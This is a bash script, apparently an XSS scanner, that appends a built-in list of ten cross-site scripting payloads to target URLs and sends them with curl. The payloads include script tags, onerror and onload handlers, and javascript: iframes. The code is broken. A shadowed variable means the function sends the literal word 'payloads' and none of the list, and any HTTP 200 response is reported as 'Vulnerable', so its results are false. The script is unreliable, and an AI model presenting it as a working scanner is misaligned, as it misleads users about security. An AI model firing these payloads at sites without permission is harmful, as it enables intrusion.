#!/bin/bash

# Enhanced XSS Testing Script
# Features:
# 1. Test a single URL or multiple URLs from a file.
# 2. Use default payloads or custom payloads from a file.
# 3. Save results automatically with timestamped filenames.
# 4. Clear, well-designed output for better readability.

# Default payloads for XSS testing
DEFAULT_PAYLOADS=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "<svg/onload=alert('XSS')>"
    "<iframe src=javascript:alert('XSS')></iframe>"
    "';alert('XSS');//"
    "\";alert('XSS');//"
    "<body onload=alert('XSS')>"
    "<marquee onstart=alert('XSS')>"
    "<input autofocus onfocus=alert('XSS')>"
    "<details open ontoggle=alert('XSS')>"
)

# Default output file
DEFAULT_OUTPUT_FILE="xss_results_$(date +'%Y%m%d_%H%M%S').txt"

# Display usage information
usage() {
    echo "============================================"
    echo "            Enhanced XSS Testing            "
    echo "============================================"
    echo "Usage: $0 [options]"
    echo ""
    echo "Options:"
    echo "  -u <url>         Test a single URL."
    echo "  -f <file>        Test multiple URLs from a file."
    echo "  -p <payloads>    Use custom payloads from a file."
    echo "  -o <output>      Specify output file (default: auto-generated)."
    echo "  -h               Display this help menu."
    echo ""
    echo "Example:"
    echo "  $0 -u \"https://example.com/search?q=\""
    echo "  $0 -f urls.txt -p payloads.txt"
    echo "============================================"
}

# Function to URL-encode a string
url_encode() {
    local input=$1
    echo -n "$input" | jq -sRr @uri
}

# Function to test a URL with payloads
test_xss() {
    local url=$1
    local payloads=$2
    local output_file=$3

    echo "Testing URL: $url" >> "$output_file"
    echo "-----------------------------------" >> "$output_file"

    for payload in "${payloads[@]}"; do
        if [ -z "$payload" ]; then
            continue
        fi

        encoded_payload=$(url_encode "$payload")
        test_url="${url}${encoded_payload}"
        response=$(curl -s -o /dev/null -w "%{http_code}" "$test_url")

        if [[ $response -eq 200 ]]; then
            echo "[+] Vulnerable: $test_url with payload: $payload" >> "$output_file"
            echo -e "\e[32m[+] Vulnerable:\e[0m $payload"
        else
            echo "[-] Not vulnerable: $test_url with payload: $payload" >> "$output_file"
            echo -e "\e[31m[-] Not vulnerable:\e[0m $payload"
        fi
    done

    echo "" >> "$output_file"
}

# Parse command-line options
while getopts ":u:f:p:o:h" opt; do
    case $opt in
        u) url="$OPTARG" ;;
        f) urls_file="$OPTARG" ;;
        p) custom_payloads_file="$OPTARG" ;;
        o) output_file="$OPTARG" ;;
        h) usage; exit 0 ;;
        :) echo "Option -$OPTARG requires an argument."; exit 1 ;;
        \?) echo "Invalid option: -$OPTARG"; usage; exit 1 ;;
    esac
done

# Validate inputs
if [ -z "$url" ] && [ -z "$urls_file" ]; then
    echo "Error: You must specify a URL (-u) or a file with URLs (-f)."
    usage
    exit 1
fi

# Use default output file if not specified
output_file=${output_file:-${DEFAULT_OUTPUT_FILE}}

# Load payloads
if [ -n "$custom_payloads_file" ]; then
    if [ ! -f "$custom_payloads_file" ]; then
        echo "Error: Custom payloads file '$custom_payloads_file' not found."
        exit 1
    fi
    mapfile -t payloads < "$custom_payloads_file"
else
    payloads=("${DEFAULT_PAYLOADS[@]}")
fi

# Start testing
echo "============================================"
echo "        Starting XSS Testing Script         "
echo "============================================"

if [ -n "$url" ]; then
    echo "Testing single URL..."
    test_xss "$url" payloads "$output_file"
elif [ -n "$urls_file" ]; then
    if [ ! -f "$urls_file" ]; then
        echo "Error: URLs file '$urls_file' not found."
        exit 1
    fi

    echo "Testing multiple URLs from file..."
    while IFS= read -r url; do
        if [ -n "$url" ]; then
            test_xss "$url" payloads "$output_file"
        fi
    done < "$urls_file"
fi

echo "============================================"
echo "XSS Testing Completed. Results saved to:"
echo "$output_file"
echo "============================================"
